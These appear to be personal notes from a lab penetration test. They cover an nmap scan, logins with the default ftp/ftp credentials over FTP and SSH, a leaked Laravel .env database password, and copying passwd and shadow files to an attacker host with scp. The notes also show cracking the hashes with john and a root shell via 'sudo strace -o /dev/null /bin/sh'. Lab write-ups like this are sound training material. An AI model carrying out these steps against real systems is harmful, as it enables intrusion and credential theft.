nmap scan 
nmap -p- -sV -sC -Pn 192.168.102.110 --open
port 21 ftp enabled
tried with anonymous not allowed
tried with ftp ftp, successful


	
	21
		uname - ftp
		pass - ftp
		but nothing after, hangs, no output
			got it, but ftp is empty, probably for file upload and accessing through web or maybe there is another ftp user
			permission denied for uploading files on ftp
			
		
	22
		ssh with ftp/ftp successfull
	53 domain
	80
		blank home page
		Apache 2.4.52 ubuntugobuster with common, big and medium no results
	Privesc
		3306 on localhost
			APP_KEY=base64:yN/2x7bTc/KG/T0BZvL8s1W4N4+Y87PXRvJm8iPWzE=
			APP_DEBUG=true
			APP_URL=http://localhost
			DB_CONNECTION=mysql
			DB_HOST=127.0.0.1
			DB_PORT=3306
			DB_DATABASE=creds
			DB_USERNAME=root
			DB_PASSWORD=Strong.DB?Password

		users clay, lisa
		/home/lisa/.bash_history
		/home/lisa/.mysql_history
		/mnt/backup/etc/adduser.conf
		passwd and shadow file /mnt/backup/etc
		scp /mnt/backup/etc/passwd kali@192.168.49.102:.
		john --wordlist=/usr/share/wordlists/rockyou.txt unshade.txt --format=crypt
		lisa peanut.
		sudo -l
		sudo strace -o /dev/null /bin/sh





